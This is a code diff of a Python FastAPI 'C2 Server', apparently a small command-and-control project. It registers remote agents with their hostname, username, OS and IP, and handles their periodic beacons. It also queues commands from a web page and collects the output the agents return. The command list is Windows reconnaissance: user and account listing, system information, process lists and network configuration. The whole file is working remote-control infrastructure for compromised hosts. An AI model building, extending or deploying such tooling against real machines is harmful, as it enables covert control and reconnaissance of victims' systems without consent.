@@ -1,202 +1,185 @@
-import json
-import uuid, time, datetime
-
-import uvicorn
-from fastapi import FastAPI, HTTPException, Request
-from fastapi.templating import Jinja2Templates
+from fastapi import FastAPI, HTTPException, Request, Form
 from pydantic import BaseModel
+import uvicorn
 from starlette.responses import HTMLResponse, RedirectResponse
+from fastapi.templating import Jinja2Templates
 
-app = FastAPI(title="C2 server")
+import time, uuid
+from datetime import datetime
+
+from starlette.staticfiles import StaticFiles
+
+app = FastAPI(title="C2 Server")
 
 templates = Jinja2Templates(directory="templates")
-
-COMMANDS = {
-    "dir": "dir",
-    "exit": "exit",
-    "list_processes": "tasklist",
-    "whoami": "whoami /all",
-    "ipconfig": "ipconfig /all"
-}
-
-
-class AgentDetails(BaseModel):
-    agent_id: str
-    name: str
-    ip_addr: str
-    # port: int
-    os_info: str
-    last_seen: float
-
-
-class TaskDetails(BaseModel):
-    id: str
-    agent_id: str
-    command: str
-    status: str = "pending"
-
-
-class TaskResult(BaseModel):
-    id: str
-    agent_id: str
-    task_id: str
-    output: str
-    result_status: int
-
+app.mount("/static", StaticFiles(directory="static"), name="static")
 
 agentsList = {}
 tasksList = {}
 resultsList = {}
 
+COMMANDS_LIST = {
+    "dir": "dir",
+    "net_user": "net user",
+    "whoami": "whoami /all",
+    "ip_config": "ipconfig /all",
+    "system_info": "systeminfo",
+    "tasklist": "tasklist",
+    "exit": "exit"
+}
+
+class AgentDetails(BaseModel):
+    id: str
+    hostname: str
+    username: str
+    os_info: str
+    ip_addr: str
+    last_seen: float
+
+class TaskDetails(BaseModel):
+    id: str
+    agent_id: str
+    command: str
+    timestamp: float
+    status: str = "pending"
+
+class TaskResult(BaseModel):
+    task_id: str
+    agent_id: str
+    output: str
+    timestamp: float
+
 
 def get_agent_status(agent):
     return "active" if (time.time() - agent.last_seen) < 120 else "inactive"
 
-
 def get_readable_time(timestamp):
-    return datetime.datetime.fromtimestamp(timestamp).strftime('%Y-%m-%d %H:%M:%S')
+    return datetime.fromtimestamp(timestamp).strftime("%Y-%m-%d %H:%M:%S")
 
 
 @app.get("/", response_class=HTMLResponse)
-async def root(request: Request):
-    """Homepage of the C2 server."""
+async def homepage(request: Request):
+    """Homepage of the C2 server"""
     agents = []
     for agent_id, agent in agentsList.items():
         agent_data = agent.dict()
         agent_data["status"] = get_agent_status(agent)
-        agent_data["last_seen_readable"] = get_readable_time(agent.last_seen)
+        agent_data["readable_last_seen"] = get_readable_time(agent.last_seen)
         agents.append(agent_data)
 
     return templates.TemplateResponse("index.html", {"request": request, "agents": agents})
 
 
-@app.get("/agent/{agent_id}")
+@app.get("/agents/{agent_id}", response_class=HTMLResponse)
 async def agent_details(request: Request, agent_id: str):
-    """Details of specific agent."""
-    if agent_id  not in agentsList:
+    """Details of a specific agent."""
+    if agent_id not in agentsList:
         return RedirectResponse(url="/", status_code=404)
 
-    return {"agent_id": agent_id, "agent_details": agentsList[agent_id]}
+    agent_data = agentsList[agent_id].dict()
+    agent_data["status"] = get_agent_status(agentsList[agent_id])
+    agent_data["readable_last_seen"] = get_readable_time(agentsList[agent_id].last_seen)
+
+    # Get all the tasks for the agent
+    agent_tasks = []
+
+    for task in tasksList[agent_id]:
+        task_data = task.dict()
+        task_data["readable_timestamp"] = get_readable_time(task.timestamp)
+
+        if task.id in resultsList:
+            result = resultsList[task.id]
+            task_data["output"] = result.output
+        else:
+            task_data["output"] = "No results yet"
+
+        agent_tasks.append(task_data)
+
+    agent_tasks.sort(key=lambda x: x["timestamp"], reverse=True)
+
+    return templates.TemplateResponse("agent.html", {"request": request, "agent": agent_data, "tasks": agent_tasks, "commands_list": COMMANDS_LIST})
 
 
 @app.post("/agentSetup")
 async def agent_setup(request: Request):
+    """Agent registers with the C2 server by sending a POST request here."""
     agent_id = str(uuid.uuid4())
     info = await request.json()
+
     agentsList[agent_id] = AgentDetails(
-        agent_id=agent_id,
-        name=info['name'],
+        id=agent_id,
+        hostname=info["hostname"],
+        username=info["username"],
+        os_info=info["os_info"],
         ip_addr=request.client.host,
-        os_info=info['os_info'],
         last_seen=time.time()
     )
-    print(f"Agent {agent_id} created! Name being {agentsList[agent_id].name}.")
 
-    # Creating an empty task list for this agent
     tasksList[agent_id] = []
 
-    return {"message": "Agent has been registered successfully!", "agent": agentsList[agent_id]}
+    return {"agent_id": agent_id}
 
 
-# Create tasks
-@app.post("/taskSetup/{agent_id}")
-async def task_setup(agent_id: str, request: Request):
+@app.post("/beacon/{agent_id}")
+async def beacon(agent_id: str):
+    """Agent sends a beacon POST request every 30 seconds here to update last seen and receive new commands."""
     if agent_id not in agentsList:
-        print(f"Agent {agent_id} not registered!")
-        raise HTTPException(status_code=404, detail="Agent not found!")
+        raise HTTPException(status_code=404, detail="Agent not found")
 
-    info = await request.json()
+    agentsList[agent_id].last_seen = time.time()
+
+    pending_tasks = [task for task in tasksList[agent_id] if task.status == "pending"]
+
+    tasks_to_send = [{"task_id": task.id, "command": task.command} for task in pending_tasks]
+
+    return {"tasksList": tasks_to_send}
+
+
+@app.post("/tasks/result")
+async def receive_results(result: TaskResult):
+    """Agent sends results to the C2 server through this POST request."""
+    if result.agent_id not in agentsList:
+        raise HTTPException(status_code=404, detail="Agent not found")
+
+    task_found = False
+    for task in tasksList[result.agent_id]:
+        if task.id == result.task_id:
+            task.status = "completed"
+            task_found = True
+            break
+
+    if not task_found:
+        raise HTTPException(status_code=404, detail="Task not found")
+
+    resultsList[result.task_id] = result
+
+    return {"status": "success"}
+
+
+@app.post("/send_command/{agent_id}")
+async def send_command(agent_id: str, cmd: str = Form(...)):
+    """Commands submitted from UI will be added to the task list here."""
+    if agent_id not in agentsList:
+        raise HTTPException(status_code=404, detail="Agent not found")
+
+    if cmd not in COMMANDS_LIST:
+        raise HTTPException(status_code=404, detail="Command not found")
+
+    command = COMMANDS_LIST[cmd]
 
     task_id = str(uuid.uuid4())
     task = TaskDetails(
         id=task_id,
         agent_id=agent_id,
-        command=info['command']
+        command=command,
+        timestamp=time.time()
     )
 
     tasksList[agent_id].append(task)
-    print(f"Task {task_id} registered to agent {agent_id}!")
-    print(f"Details of tasks for this agent: {tasksList[agent_id]}.")
 
-    return {"message": "Task has been created successfully!", "task": task}
-
-
-@app.post("/beacon/{agent_id}")
-async def beacon(agent_id: str):
-    if agent_id not in agentsList:
-        print("Invalid agent ID!")
-        raise HTTPException(status_code=404, detail="Agent not found!")
-
-    # Update last seen of agent
-    agentsList[agent_id].last_seen = time.time()
-
-    # Add tasks
-    pending_tasks = [task for task in tasksList[agent_id] if task.status == "pending"]
-
-    # We need to send only task_id and command to agent, since agent_id is not needed to be sent to the agent in this case
-    '''
-    Send the below JSON:
-    {
-        [
-            {"task_id": <task id>, "command": <command>},
-            {"task_id": <task id>, "command": <command>}
-            ...
-            ...
-            ...
-        ]
-    }
-    '''
-
-    send_tasks = [{"task_id": task.id, "command": task.command} for task in pending_tasks]
-
-    # TODO: Update this and remove the dummy setup below
-    # This will be sent to the agent when it beacons and if there are any tasks pending
-    # return {"tasksList": send_tasks}
-
-    # Dummy tasks setup
-    dum1 = {"task_id": str(uuid.uuid4()), "command": COMMANDS["dir"]}
-
-    dummy_list = [dum1]
-
-    return {"tasksList": dummy_list}
-
-
-@app.get("/agents")
-async def get_agents():
-    print("List of all agents printed to screen!")
-    return {"agents": [agent for agent in agentsList.values()]}
-
-
-@app.get("/results/{task_id}")
-async def view_results(task_id: str):
-    if task_id not in resultsList:
-        raise HTTPException(status_code=404, detail="Task not found!")
-    print(f"Task {task_id} found and is printed to screen!")
-    return {"result": resultsList[task_id]}
-
-
-@app.post("/tasks/result")
-async def receive_results(request: Request):
-    print("Receiving results from agent!!")
-
-    info = await request.json()
-
-    result_id = str(uuid.uuid4())
-    result = TaskResult(
-        id=result_id,
-        agent_id=info['agent_id'],
-        task_id=info['task_id'],
-        output=info['output'],
-        result_status=1 
-    )
-
-    if result.agent_id not in agentsList:
-        raise HTTPException(status_code=404, detail="Agent not found!")
-
-    resultsList[result_id] = result
-    print(f"Details of results for {result_id}: {resultsList[result_id]}.")
-    return {"result": "success"}
+    # Redirect back to the agent page
+    return RedirectResponse(url=f"/agents/{agent_id}", status_code=303)
 
 
 if __name__ == "__main__":
-    uvicorn.run(app, host="0.0.0.0", port=8000, reload=True)
+    uvicorn.run("main:app", host="0.0.0.0", port=8000, reload=True)
